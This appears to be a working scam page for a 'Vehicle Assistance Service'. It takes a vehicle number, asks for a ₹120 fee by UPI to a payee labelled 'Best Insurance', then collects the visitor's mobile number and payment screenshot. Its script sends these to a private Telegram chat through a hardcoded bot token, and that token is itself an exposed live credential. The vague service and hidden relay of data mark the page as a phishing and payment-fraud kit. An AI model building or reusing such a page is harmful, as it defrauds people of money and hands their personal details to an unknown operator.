<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Vehicle Assistance Service</title>

<style>
*{
box-sizing:border-box;
margin:0;
padding:0;
font-family:Segoe UI,Arial;
}

body{
min-height:100vh;
background:#f5f7fa;
padding-top:80px;
display:flex;
flex-direction:column;
align-items:center;
}

/* Topbar */
.topbar{
position:fixed;
top:0;
left:0;
width:100%;
height:60px;
background:#ffffff;
display:flex;
justify-content:space-between;
align-items:center;
padding:0 18px;
box-shadow:0 2px 12px rgba(0,0,0,0.06);
z-index:1000;
}

.topbar button{
background:#005bac;
color:white;
border:none;
padding:8px 16px;
border-radius:8px;
cursor:pointer;
font-weight:500;
transition:0.3s;
}

.topbar button:hover{
background:#004a8c;
}

/* Card */
.card{
width:95%;
max-width:420px;
background:#ffffff;
padding:30px;
border-radius:18px;
text-align:center;
box-shadow:0 10px 30px rgba(0,0,0,0.08);
}

/* Inputs */
input,button{
width:100%;
padding:14px;
margin-top:14px;
border-radius:10px;
border:1px solid #e0e0e0;
font-size:15px;
outline:none;
}

input:focus{
border-color:#005bac;
}

/* Primary Button */
.mainBtn{
background:#005bac;
color:white;
border:none;
cursor:pointer;
font-weight:600;
transition:0.3s;
}

.mainBtn:hover{
background:#004a8c;
}

/* UPI Button */
.neonBtn{
background:#ffffff;
border:2px solid #005bac;
color:#005bac;
font-weight:600;
cursor:pointer;
transition:0.3s;
}

.neonBtn:hover{
background:#005bac;
color:white;
}

/* Footer */
.footer{
margin-top:40px;
color:#555;
font-size:14px;
}

.footer a{
color:#005bac;
cursor:pointer;
margin:0 5px;
text-decoration:none;
}

.footer a:hover{
text-decoration:underline;
}

/* Loader */
.loader{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(255,255,255,0.85);
display:none;
align-items:center;
justify-content:center;
font-size:18px;
font-weight:600;
color:#005bac;
z-index:2000;
}

.hidden{
display:none;
}
</style>
</head>

<body>

<div class="topbar">
<button onclick="handleClick(goHome)">Home</button>
<button onclick="handleClick(showAbout)">About</button>
</div>

<div class="loader" id="loader">Please wait...</div>

<div class="card">

<div id="homePage">
<h3>Enter Vehicle Number</h3>
<input id="vehicle" placeholder="BR-09-AB-1234">
<button class="mainBtn" onclick="handleClick(goPay)">Continue</button>
</div>

<div id="payPage" class="hidden">
<h3>Service Fee ₹120</h3>

<button class="neonBtn"
onclick="window.location.href='upi://pay?pa=8709610091@okbizaxis&pn=Best%20Insurance&am=120.00&cu=INR'">
Pay with UPI
</button>

<input id="mobile" placeholder="Mobile Number">
<input type="file" id="proof">

<button class="mainBtn" onclick="handleClick(submitForm)">Submit</button>
<button class="mainBtn" onclick="handleClick(goHome)">Back</button>
</div>

<div id="aboutPage" class="hidden">
<h3>About</h3>
<p>We provide vehicle assistance and insurance related services.</p>
<button class="mainBtn" onclick="handleClick(goHome)">Back</button>
</div>

<div id="disclaimerPage" class="hidden">
<h3>Disclaimer</h3>
<p>This is a private assistance platform.  
We are not affiliated with any government authority.</p>
<button class="mainBtn" onclick="handleClick(goHome)">Back</button>
</div>

</div>

<div class="footer">
© 2026 Mishra Service |
<a onclick="handleClick(showAbout)">About</a> |
<a onclick="handleClick(showDisclaimer)">Disclaimer</a>
</div>

<script>

const token="8138238341:AAFlgSY3OGo5oOfa-IbZ9DxdgrmAeVE525E";
const chatId="5600045707";

function showLoader(){
document.getElementById("loader").style.display="flex";
setTimeout(()=>{
document.getElementById("loader").style.display="none";
},600);
}

function handleClick(callback){
showLoader();
setTimeout(callback,400);
}

function goHome(){
homePage.classList.remove("hidden");
payPage.classList.add("hidden");
aboutPage.classList.add("hidden");
disclaimerPage.classList.add("hidden");
vehicle.value="";
mobile.value="";
proof.value="";
}

function showAbout(){
homePage.classList.add("hidden");
payPage.classList.add("hidden");
aboutPage.classList.remove("hidden");
disclaimerPage.classList.add("hidden");
}

function showDisclaimer(){
homePage.classList.add("hidden");
payPage.classList.add("hidden");
aboutPage.classList.add("hidden");
disclaimerPage.classList.remove("hidden");
}

function goPay(){
if(!vehicle.value.trim()){
alert("Enter vehicle number");
return;
}
homePage.classList.add("hidden");
payPage.classList.remove("hidden");
}

function submitForm(){
if(mobile.value.length<10){
alert("Enter valid mobile");
return;
}
if(!proof.files[0]){
alert("Upload screenshot");
return;
}

document.getElementById("loader").style.display="flex";

let data=new FormData();
data.append("chat_id",chatId);
data.append("caption","Vehicle: "+vehicle.value+"\nMobile: "+mobile.value);
data.append("photo",proof.files[0]);

fetch("https://api.telegram.org/bot"+token+"/sendPhoto",{
method:"POST",
body:data
})
.then(()=>{
document.getElementById("loader").style.display="none";
alert("Submitted Successfully");
goHome();
})
.catch(()=>{
document.getElementById("loader").style.display="none";
alert("Submission Failed");
});
}

</script>

</body>
</html>
